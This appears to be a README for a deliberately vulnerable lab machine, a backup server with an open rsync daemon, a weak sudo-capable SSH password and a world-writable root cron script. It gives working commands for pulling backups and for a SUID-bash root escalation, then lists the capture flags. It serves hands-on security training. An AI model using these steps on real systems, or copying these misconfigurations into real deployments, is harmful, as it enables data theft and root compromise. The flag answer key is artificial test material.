# 🏢 VulnCorp — Machine 11: int-backup01 (Backup Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 11 is the central backup server in the **Internal Zone (`192.168.1.50`)** running an **Unauthenticated rsync daemon** exposing full system backups, shadow hashes, and database dumps, plus a **world-writable cron job** for local root privilege escalation.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on your **Debian 13 VM** (`192.168.1.50`):

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/int-backup01

chmod +x deploy.sh
sudo ./deploy.sh
```

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **rsync daemon** | `873` | Rsync 3.x | **No Authentication Required** — allows listing and downloading all backups |
| **SSH** | `22` | OpenSSH | User `backupadmin` (`backup123`) has sudo access |
| **Cron** | *Local* | Root Crontab | Runs `/opt/backup/run.sh` (world-writable `chmod 777`) every minute |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Unauthenticated rsync Backup Exfiltration
```bash
# Enumerate available backup modules
rsync rsync://192.168.1.50/

# Download full backup module (contains Domain Controller shadow hashes)
rsync -avz rsync://192.168.1.50/full-backup/ /tmp/dc_backups/

# Download database backup module (contains plaintext SQL dumps)
rsync -avz rsync://192.168.1.50/db-backup/ /tmp/db_dumps/

# Download config files (contains rsyncd credentials)
rsync -avz rsync://192.168.1.50/config-backup/ /tmp/configs/
```

### 2. Local Privilege Escalation via Writable Cron Job
After gaining SSH access as `backupadmin`:
```bash
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /opt/backup/run.sh
# Wait 60 seconds, then execute:
/tmp/rootbash -p
```

---

## 🏆 Flags

- **rsync Config Flag:** `rsyncd.secrets` (`VULN{rsync_c0nf_cr3ds}`)
- **Full Backup Dump Flag:** `flag.txt` (`VULN{rsync_full_b4ckup}`)
- **Root Flag:** `/root/root.txt` (`VULN{b4ckup_s3rv3r_r00t3d_m4ch1n3_11}`)
